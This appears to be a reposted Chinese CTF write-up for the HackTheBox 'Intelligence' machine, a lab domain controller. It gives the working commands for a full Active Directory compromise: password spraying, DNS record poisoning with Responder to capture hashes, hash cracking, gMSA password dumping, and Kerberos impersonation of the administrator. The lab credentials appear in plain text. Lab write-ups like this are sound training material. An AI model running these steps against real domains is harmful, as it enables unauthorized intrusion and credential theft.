<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/C22yWT5k8IS_76_ukz2Pwg)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OgMQ9IUHVFKXdmTqTib6kkibx3rNVtoyYIRUaYcLjYJKzj0gzZvMfLMibA/640?wx_fmt=png)

靶机信息
----

靶机地址:

```
https://app.hackthebox.com/machines/Intelligence
```

靶场: HackTheBox.com

靶机名称: Intelligence

难度: 中等

提示信息:

```
无
```

目标: user.txt 和 root.txt

实验环境
----

```
攻击机:Kali 10.10.16.4

靶机:10.10.10.248
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
sudo masscan -p1-65535 -i tun0 10.10.10.248
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OfyLoMYCribbuJA91LBS48yciaVu0DaVic7Gic1UAsXicVqspLVeApaTStQw/640?wx_fmt=png)

```
sudo nmap -sC -sV -p 53,80,88,139,445,3268,5985 10.10.10.248 -oN nmap.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OjDfuBXzxx2lEQ9vbZpbiaoSiaq8QQKcicPOAsYg5pmmDQibcyIZYMlh0Fg/640?wx_fmt=png)

靶机开放多个端口 53(DNS),80(HTTP),445(SMB),5985(WinRM)，从主机开放的 88,3268 可以判断出这是台域控主机，5985 端口提供一个域名`intelligence.htb`，先来看看 445 端口

### TCP:445(SMB)

```
enum4linux -a 10.10.10.248
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OuKQ9mefkfgniardkQ769UT5iauFksvRq3UKxQSy31iaFiaWibVOucnv1RuA/640?wx_fmt=png)

```
smbmap -H 10.10.10.248
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8O8q6rUCMZHgqAt1LtgWaR5QxHnAOBOZ8ic0JrP5eUic1icT3t0FLrVj71g/640?wx_fmt=png)

SMB 中未发现可利用信息，再来看看 80 端口

### TCP:80(HTTP)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OxAJ904WxT5YicMyYnHjbtOvRUODiadqbrse6UTHicFB9XpicWZoeBIbGXw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OnBSmUax06GgWkTbwaNJlq7SomeoS5iaI10qOeFnLBVQTbgcsMWoXYOw/640?wx_fmt=png)

访问页面中发现两个 pdf 文件和一个提交邮箱的功能，页面最下面有个邮箱地址可能是个账号，暂未发现可利用信息，先做个目录扫描

```
dirsearch -u http://10.10.10.248
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OYQibKXxqlqqbjhDeFiafeiamYLL90QTLALfRWDCYic3dSW8o8vvNkmRLmQ/640?wx_fmt=png)

发现 documents 目录，继续对这个目录进行目录扫描

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OyIiaKV2utIbg5TpFKicFciaATKzMZgsGaOaAARWf1RZoM4babL6v1dFyw/640?wx_fmt=png)

通过 Wappalyzer 插件发现程序语言为 PHP，所以针对 PHP 进行扫描

```
dirsearch -u http://10.10.10.248/documents -t 5 --retries 5 -e php
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OSLYQibWISt1acvmrO8xibfKWfxbJXXU8IOkrIF9oEC2dwt6v4sDnFEAA/640?wx_fmt=png)

只跑出来一个图标，绑定域名看看

```
sudo vim /etc/hosts
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8Oo9HSsyW0evNBagl1fBFDAdibhwgFjY4HM0fGI4R63XYR9SqOibXEjYvA/640?wx_fmt=png)

使用域名访问与 IP 访问是同一个站点，再来看看 dns

### TCP/UDP:53(DNS)

```
dig @10.10.10.248 intelligence.htb
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OJMezucUY1BsRuJiaKLZ6Q62M9hr7QXo2cV1KzPJM8M3fNS8TpPNVRYw/640?wx_fmt=png)

```
dig axfr @10.10.10.248 intelligence.htb
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8Ol5YSgvjwesrd8Iia3wzPm8QRyJNdM3icpg5DRicsLGrAEow0DWfia5XQdA/640?wx_fmt=png)

dig 未发现可利用信息，继续枚举 DNS

```
dnsenum --dnsserver 10.10.10.248 intelligence.htb -f ~/HackTools/Dict/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OicplDwmZ4wTjZ1ic5cHJcJiaeEicxzajlt0L6RQf37fR8MwDrSMooo7tWA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8Ov4zicJNSNfLoaQey2eiaNGnMuYcJfx4LDCHUIAJtgc87PeVPKUyV4Anw/640?wx_fmt=png)

发现两个子域名`domaindnszones.intelligence.htb`,`forestdnszones.intelligence.htb`绑定后访问

```
sudo vim /etc/hosts
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OX4ibqRtfGVLmic3rq2M2BJicR56EZNUNTArfz67dRYbmbVPM4EZFEZYIw/640?wx_fmt=png)

域名访问与 IP 访问是相同页面，没有利用价值。没什么思路了，再重头来一遍

HTTP 服务中的 PDF 名字按日期命名，猜测存在其他日期命名的文件，用模糊测试验证一下

漏洞利用 (Exploitation)
-------------------

### 模糊测试

```
wfuzz -c -z range,2020-2022 -z range,01-12 -z range,01-31 -m product -u http://10.10.10.248/documents/FUZZ-FUZ2Z-FUZ3Z-upload.pdf --sc=200
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OhpnBTqrwuvaeGJkbZfDvaoZKdRibR6xMLvEvMqzaqbzsu7DmnMZfbLQ/640?wx_fmt=png)

pdfurl.txt

```
http://10.10.10.248/documents/2020-01-01-upload.pdf
http://10.10.10.248/documents/2020-01-02-upload.pdf
http://10.10.10.248/documents/2020-01-04-upload.pdf
http://10.10.10.248/documents/2020-01-20-upload.pdf
http://10.10.10.248/documents/2020-01-23-upload.pdf
http://10.10.10.248/documents/2020-01-10-upload.pdf
http://10.10.10.248/documents/2020-01-30-upload.pdf
http://10.10.10.248/documents/2020-01-25-upload.pdf
http://10.10.10.248/documents/2020-01-22-upload.pdf
http://10.10.10.248/documents/2020-02-17-upload.pdf
http://10.10.10.248/documents/2020-02-11-upload.pdf
http://10.10.10.248/documents/2020-03-12-upload.pdf
http://10.10.10.248/documents/2020-03-05-upload.pdf
http://10.10.10.248/documents/2020-02-23-upload.pdf
http://10.10.10.248/documents/2020-03-04-upload.pdf
http://10.10.10.248/documents/2020-02-28-upload.pdf
http://10.10.10.248/documents/2020-02-24-upload.pdf
http://10.10.10.248/documents/2020-03-13-upload.pdf
http://10.10.10.248/documents/2020-03-21-upload.pdf
http://10.10.10.248/documents/2020-03-17-upload.pdf
http://10.10.10.248/documents/2020-04-02-upload.pdf
http://10.10.10.248/documents/2020-04-04-upload.pdf
http://10.10.10.248/documents/2020-04-15-upload.pdf
http://10.10.10.248/documents/2020-04-23-upload.pdf
http://10.10.10.248/documents/2020-05-01-upload.pdf
http://10.10.10.248/documents/2020-05-03-upload.pdf
http://10.10.10.248/documents/2020-05-07-upload.pdf
http://10.10.10.248/documents/2020-05-11-upload.pdf
http://10.10.10.248/documents/2020-05-17-upload.pdf
http://10.10.10.248/documents/2020-05-20-upload.pdf
http://10.10.10.248/documents/2020-05-21-upload.pdf
http://10.10.10.248/documents/2020-05-24-upload.pdf
http://10.10.10.248/documents/2020-06-08-upload.pdf
http://10.10.10.248/documents/2020-06-07-upload.pdf
http://10.10.10.248/documents/2020-06-04-upload.pdf
http://10.10.10.248/documents/2020-06-03-upload.pdf
http://10.10.10.248/documents/2020-06-02-upload.pdf
http://10.10.10.248/documents/2020-05-29-upload.pdf
http://10.10.10.248/documents/2020-06-12-upload.pdf
http://10.10.10.248/documents/2020-06-14-upload.pdf
http://10.10.10.248/documents/2020-06-15-upload.pdf
http://10.10.10.248/documents/2020-06-21-upload.pdf
http://10.10.10.248/documents/2020-06-22-upload.pdf
http://10.10.10.248/documents/2020-06-26-upload.pdf
http://10.10.10.248/documents/2020-06-25-upload.pdf
http://10.10.10.248/documents/2020-06-28-upload.pdf
http://10.10.10.248/documents/2020-06-30-upload.pdf
http://10.10.10.248/documents/2020-07-02-upload.pdf
http://10.10.10.248/documents/2020-07-06-upload.pdf
http://10.10.10.248/documents/2020-07-08-upload.pdf
http://10.10.10.248/documents/2020-07-24-upload.pdf
http://10.10.10.248/documents/2020-07-20-upload.pdf
http://10.10.10.248/documents/2020-08-01-upload.pdf
http://10.10.10.248/documents/2020-08-03-upload.pdf
http://10.10.10.248/documents/2020-08-09-upload.pdf
http://10.10.10.248/documents/2020-08-20-upload.pdf
http://10.10.10.248/documents/2020-08-19-upload.pdf
http://10.10.10.248/documents/2020-09-02-upload.pdf
http://10.10.10.248/documents/2020-09-04-upload.pdf
http://10.10.10.248/documents/2020-09-06-upload.pdf
http://10.10.10.248/documents/2020-09-05-upload.pdf
http://10.10.10.248/documents/2020-09-11-upload.pdf
http://10.10.10.248/documents/2020-09-13-upload.pdf
http://10.10.10.248/documents/2020-09-16-upload.pdf
http://10.10.10.248/documents/2020-09-22-upload.pdf
http://10.10.10.248/documents/2020-09-27-upload.pdf
http://10.10.10.248/documents/2020-09-30-upload.pdf
http://10.10.10.248/documents/2020-10-05-upload.pdf
http://10.10.10.248/documents/2020-09-29-upload.pdf
http://10.10.10.248/documents/2020-10-19-upload.pdf
http://10.10.10.248/documents/2020-11-01-upload.pdf
http://10.10.10.248/documents/2020-11-03-upload.pdf
http://10.10.10.248/documents/2020-11-06-upload.pdf
http://10.10.10.248/documents/2020-11-11-upload.pdf
http://10.10.10.248/documents/2020-11-13-upload.pdf
http://10.10.10.248/documents/2020-11-10-upload.pdf
http://10.10.10.248/documents/2020-11-24-upload.pdf
http://10.10.10.248/documents/2020-11-30-upload.pdf
http://10.10.10.248/documents/2020-12-10-upload.pdf
http://10.10.10.248/documents/2020-12-15-upload.pdf
http://10.10.10.248/documents/2020-12-20-upload.pdf
http://10.10.10.248/documents/2020-12-24-upload.pdf
http://10.10.10.248/documents/2020-12-30-upload.pdf
http://10.10.10.248/documents/2020-12-28-upload.pdf
http://10.10.10.248/documents/2021-01-03-upload.pdf
http://10.10.10.248/documents/2021-01-14-upload.pdf
http://10.10.10.248/documents/2021-01-25-upload.pdf
http://10.10.10.248/documents/2021-01-30-upload.pdf
http://10.10.10.248/documents/2021-02-10-upload.pdf
http://10.10.10.248/documents/2021-02-13-upload.pdf
http://10.10.10.248/documents/2021-02-21-upload.pdf
http://10.10.10.248/documents/2021-02-25-upload.pdf
http://10.10.10.248/documents/2021-03-01-upload.pdf
http://10.10.10.248/documents/2021-03-07-upload.pdf
http://10.10.10.248/documents/2021-03-10-upload.pdf
http://10.10.10.248/documents/2021-03-18-upload.pdf
http://10.10.10.248/documents/2021-03-27-upload.pdf
http://10.10.10.248/documents/2021-03-25-upload.pdf
http://10.10.10.248/documents/2021-03-21-upload.pdf
```

发现大量 pdf 文件，下载下来看看

```
mkdir pdf
cd pdf
wget -i ../pdfurl.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OkGKk7sHYuF4bOdxh3yBtUmhNogFyrbRndUcfEfx8sxylgPjWjeyWHg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OQsk2WDWxqj8MumI4ibRE9qExib1ibtJR2FHmmwu50nPuWS9R0UT3JMkrw/640?wx_fmt=png)

这么多文件一个个打开可看不过来，找个查看器输出内容再过滤显示

先将 pdf 转换为 txt

```
for file_name in ./*.pdf; do pdftotext $file_name;done
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OHtCK5I5OYFAj1FtzhKic7Ekicm3KzaIib61uKJW2YGf2oNhMZ8kUTb9LA/640?wx_fmt=png)

输出 txt 内容并匹配关键字 user，username，passwd，password，account，login，intelligence

```
for file_name in ./*.txt; do echo $file_name; grep -E "user|username|passwd|password|account|login|intelligence" $file_name;done
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8O3XGWEs0zMeoKQf0ZK6KOAHdCR7UF9SMfRWLibzCojFnI89H0XDibRgNQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8ODx9Qiaiaum4BDjHTroLCvDzZrl3HJHCzC3QoiaDKzoBfiaTreibOWmKjHLg/640?wx_fmt=png)

匹配到 2 个文件，来查看下内容

```
cat 2020-12-30-upload.txt
cat 2020-06-04-upload.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OjJcshbicXmVk6GXJdZLqgiaDaoXh6fkgwz3AsOZsQgVJbvxiaiaeVm62nQ/640?wx_fmt=png)

其中 2020-06-04-upload.txt 提供了一个密码`NewIntelligenceCorpUser9876`但是没有账号，看提示内容这是新用户的默认密码，再来找找用户账号信息

```
exiftool 2020-06-04-upload.pdf
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OAqp3mzpRpTlCzpeicYjX396UicBDia8BjhM8MzxVzeNmtP06adIRlmUicw/640?wx_fmt=png)

使用 exiftool 工具查看 pdf 文档的相关信息发现文档创建者`Jason.Patterson`，再来看看其他文档是否为同一人

```
exiftool 2020-06-04-upload.pdf
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8ODickzsFOamHBq5OibVrMZMF5Ik48Zibx3QicGd09UicTI399pTaYfTZdOjA/640?wx_fmt=png)

创建人不同，收集全部文档的创建者名字

```
touch namefile.txt
for file_name in ./*.pdf;do exiftool $file_name |grep Creator >>namefile.txt;done
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OgHbalvMCSaATMjERA3zjPPGUibPyHSEZAsTTnJULNGVfUdx0ibuOibP1A/640?wx_fmt=png)

拿到名单，去掉无效的内容，再去掉重复的名字

```
ed -i 's/Creator                         : //g' namefile.txt
cat namefile.txt | sort -u > name.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OlGcM8BZaEGyJfN7y8xK375KTsiayr8wFr3G6lJAeCW7zFVt8v937SVw/640?wx_fmt=png)

现在有了账号和密码，验证一下

### 密码喷洒

```
crackmapexec smb 10.10.10.248 -u name.txt -p 'NewIntelligenceCorpUser9876' --continue-on-success
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8O7W7iaQ63icjojPIhe6JJFVVebTdTaIzS9rFueGmibQYeYtLoiaeEFv9spA/640?wx_fmt=png)

匹配到一组账号密码`Tiffany.Molina:NewIntelligenceCorpUser9876`，尝试登录 SMB

先看下有哪些共享目录有权限

```
smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OZeus2H5YMChn4DFlpXvH3Gh3b2iauZALevd64pt7fCicJyJnjhfYmjhQ/640?wx_fmt=png)

发现两个目录，登录查看

```
smbclient //10.10.10.248/Users -U Tiffany.Molina%NewIntelligenceCorpUser9876
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OOOndxiaS0nXr2XsGtudszEuM2ibJzamR2dgDc9ItadFtTW53u9jdvQmg/640?wx_fmt=png)

在 Tiffany.molina 用户的桌面上发现 user.txt，拿到第一个 flag，其他目录示发现敏感信息。再来看看 IT 共享目录

```
smbclient //10.10.10.248/IT -U Tiffany.Molina%NewIntelligenceCorpUser9876
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OGriaMFQdctkaJGyEoicv8jZIiaCvriac4A7Rficq0oAibcEgWiaSy7PALiaOZA/640?wx_fmt=png)

发现`downdetector.ps1`PowerShell 脚本，脚本内容为每 5 分钟登录一次 LDAP 获取计算机名字，再筛选出以 web 开头的计算机，尝试向该设备的 HTTP 发送身份验证请求，并将状态不是 200 的设备信息以邮件的方式发送给`Ted.Graves@intelligence.htb`。

### 思路

默认域中用户都有修改 DNS 的权限，使用 Tiffany.Molina 向域中 DNS 添加一条新记录，将地址转到攻击机上，当`downdetector.ps1`访问 web 开头的主机发送身份验证时，就可以获取密码 hash。验证一下。

还需要用到两个工具 dnstool(修改 DNS 记录) 和 Responder(用于交互应答)

dnstool 仓库地址

```
https://github.com/dirkjanm/krbrelayx
```

```
git clone https://github.com/dirkjanm/krbrelayx.git
cd krbrelayx
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OekC1b8ZTp8vbe6rO2FWxXNf9e3yLC3h24GIwF13P6HiaCskRo31bpAA/640?wx_fmt=png)

Responder 仓库地址:

```
https://github.com/SpiderLabs/Responder
```

```
git clone https://github.com/SpiderLabs/Responder.git
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OaQW8q1fN50jHIoZDVzmwtGC2UiaHHicG26AhmKzPkvW25dPBa0dpE5ibg/640?wx_fmt=png)

先使用 Responder 监听 80 端口

```
sudo py2 Responder.py -I tun0
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OeX8ewu5feuQCk4kuThdUYQNLO8C4oO74pDbE3S7eFE2CKbUsXhibzAQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8ODhEWQem32m9WWRUQaUHIx5gpoB2lbhwpJ15tf2VI11INn3vwu6SgAQ/640?wx_fmt=png)

向靶机 DNS 添加 A 记录

```
py3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 -a add -t A -r web01 -d 10.10.16.4  10.10.10.248
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OicufA3dgRfeDSyWYepNbsGvqKickJS5ugGdQGhyTicsIuf6CX9iaErQhicg/640?wx_fmt=png)

添加记录成功，等待 5 分钟内靶机访问

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8ODThVDfWeKPwT62umiajfiaHsuloWoHNOmdnYgKIThTuHP7vrRFXCUyRw/640?wx_fmt=png)

拿到 hash 密码，保存下来尝试破解

### 密码暴破

```
vim hash.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OoibHgic4rA2HlYbdk3Nhrz1KS5EJZ8EpOMrlic5meUIic8BkAMFcEz84Nw/640?wx_fmt=png)

```
john hash.txt --wordlist=../../Dict/rockyou.txt --format=netntlmv2
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OI85OpFQBS1X3e87uNM2iahHUnbyhLzia8uynxvjxWm3YTpKfDxfoQNdw/640?wx_fmt=png)

拿到 Mr.Teddy 的密码，尝试登录

```
py3 ../../impacket/examples/psexec.py 'Mr.Teddy:Ted.Graves'@10.10.10.248
evil-winrm -i 10.10.10.248 -u Mr.Teddy -p Ted.Graves
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8ObOjBI7bS0hkMdUQQBJ73lDyaP2DsZc6cMc2KVrmI2TxGzALKQh58gQ/640?wx_fmt=png)

登录失败，尝试收集域信息

权限提升 (Privilege Escalation)
---------------------------

### BloodHound 收集域内信息

1。下载 bloodhound.py 用于获取信息

```
git clone https://github.com/fox-it/BloodHound.py.git
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OPbJkk6eGFLUqkjNZj1BCqlySA2JiaU5vlpaaKoXxAY5N5kmc91Xia9dg/640?wx_fmt=png)

```
py3 bloodhound.py  -c ALL -u TED.GRAVES -p Mr.Teddy -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OxF3kaZ6TFoAQZphic7Tm3R2icbDwrV6VgEQ2TsrZGoP46yDyfNgo4CpQ/640?wx_fmt=png)

运行后会在目录下生成一些 json 文件，将文件拖放到 bloodhound 程序中

2。启动 neo4j

```
sudo apt install neo4j
sudo neo4j start
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OvyGEUPh3iapPEb9fP17uxyhciau0fYvA2vgWGtN6O2WwTqST4nh3vXow/640?wx_fmt=png)

3。下载并运行 BloodHound 用于展示域信息

仓库地址：

```
https://github.com/BloodHoundAD/BloodHound/releases
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8O8LOaKpbsxj4FW2IMk8Fxnic5ibdZVqms26AcsYnDGQibrlK25eKUC15LQ/640?wx_fmt=png)

下载编译好的版本

```
wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-linux-x64.zip
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OLbbFLE1e5aHHFQz37VVGK8WwARIraH2g7Kxre4yyEpCxW7EPnjbD5A/640?wx_fmt=png)

解压

```
unzip BloodHound-linux-x64.zip
cd BloodHound-linux-x64
./BloodHound --no-sandbox
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8O0u4OcNzn8sVW0EXXzviaR2n2HZU9z1EMSibV8YgYRaP58uKuQzf0fG4g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OhOCiarjdTF7S1GoOgO7TFyv9HfcqYH2s0fQ1sDibliaZdkye3BPD0rICA/640?wx_fmt=png)

启动后会打开 bloodhound 程序（登录框中账号密码均为 neo4j），将拿到的 json 文件全部拖入程序中

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8O7XyGXyWLicAvFaeVjjNhVaWSQ5JTbDlvI24DkKKW9WI8Gr4PrB7JpZg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OlB13d4Rpw6niaLZuQlC0RA5qmepHYZ0ib1lwwcbYDCtGBkZBSCiawHm9A/640?wx_fmt=png)

导入后如果发现没有数据，将其关闭再次打开即可

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8Ow3RTAmA5UGt5Aib4CtiaCFW1ag3mxzfXiae8ywriccToUCedicaaQv0YcBA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OibLXjM5ibB3QWaUFoCjZj6bymRQ1eIBEMicxeWbqKtZ2u2RUwRRjJicfkg/640?wx_fmt=png)

通过主体最短路径发现 TED.GRAVES 属于 ITSUPPORT 组，该组对 SVC_INT 拥有读取密码的权限，

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OEHCHATSsib52qsPpebrfYcPZVwiaOfJxdblL5vx9eG9Gsw9SI3cVMnGw/640?wx_fmt=png)

通过帮助信息知道如何获取 SVC_INT 的密码，来验证一下.

gMSADumper 仓库：

```
https://github.com/micahvandeusen/gMSADumper
```

```
git clone https://github.com/micahvandeusen/gMSADumper.git
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OLrre4Cw3KiavncdIemibjaoLjQDWLmlRz63MGFicVEVLQrKZsK5FLtQuw/640?wx_fmt=png)

安装环境

```
py3 -m pip install -r requirements.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OHia6ggDmejUPJ7ttWR4O8bia9uibXicwbgY3jpRicDwphx3KMP4EBTwaOvA/640?wx_fmt=png)

开始攻击，获取 svc_int 密码

```
py3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OerOzrm8v9XSsRQYZL6xZk781icdX747Ppa5uweTVkBZ54LHzicibDsP4Q/640?wx_fmt=png)

拿到 SVC_INT 的 HASH，还需要知道域控的 SPN（主体服务名称），来看一下

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8O3EF1bmUXKocajCXFnxYnMozxO5ibicKjsMFDDs2QdeUySPic6LJKcZH7w/640?wx_fmt=png)

SPN 为 WWW/dc.intelligence.htb，现在可以用来获取 TGT

```
impacket-getST -spn www/dc.intelligence.htb -hashes :4aa758209122662dc0ee185e58211b7a -dc-ip 10.10.10.248 -impersonate administrator intelligence.htb/svc_int
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OpytTCMVOFoia8RG5GMYGf6Ecuf54ictpVMXIekwjsrrTOmyG2nqRjQUg/640?wx_fmt=png)

提示时钟偏差过大，在攻击上与域上的时间同步

安装时间同步工具。并执行同步，同步之前还需要将自动同步关闭

```
sudo service virtualbox-guest-utils stop
```

```
sudo apt install ntpupdate
sudo ntpdate -s intelligence.htb
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8Ocj7uica308ODclsuUgjUHMawmKzibxSNUjkOszCvW7D0atibgmu3ticpbw/640?wx_fmt=png)

完成后没有任何提示，可以使用 date 在同步前后做对比。继续攻击

```
impacket-getST -spn www/dc.intelligence.htb -hashes :4aa758209122662dc0ee185e58211b7a -dc-ip 10.10.10.248 -impersonate administrator intelligence.htb/svc_int
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OfESAO2poAf5nhgGQrNydWjLXE8ZIib3C2bJ2chAcDQV8BIwSUDbN64Q/640?wx_fmt=png)

拿到 TGT(TGT 已被写入 administrator.ccache 中)，继续攻击

绑定域控 IP

```
sudo vi /etc/hosts
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8Os2dibVQYQ4u3LeHJqdW01Xf8iaPZQRuDxmIbdsJeHNhXTich6Lia6xQFsQ/640?wx_fmt=png)

```
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8Osx4HICrKQeaNcrd5ttliclMlzCQCM5I3lfx472W4AnZqCAYn8wVWY5Q/640?wx_fmt=png)

拿到域控权限，来找找 flag

```
cd users
type Tiffany.Molina\desktop\user.txt
type administrator\desktop\root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8Ot0JhlfjdqSg7ItWmQ1G8vMOPJoBOtyOO86T0Byd9OnP3BuMq4yBZkQ/640?wx_fmt=png)

拿到 root.txt，游戏结束

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8O5mT9wHIQBI5Txn96HefnTSuT1yrwNudV0qXCj1rVyrVlH63tHZXRKw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OoKCc4JFRQQeFEMK3qibBaiaUh5MYdIJ2ibbgk3vx7Cql2bVYic7cDsOkMw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUtMV1ia7kK79z8w58QdlHM8OApbWCtNAY3VbDbg75AFdBq8ictyCrfBYNDI3l2Wco7C5nQWicluvXYNw/640?wx_fmt=jpeg)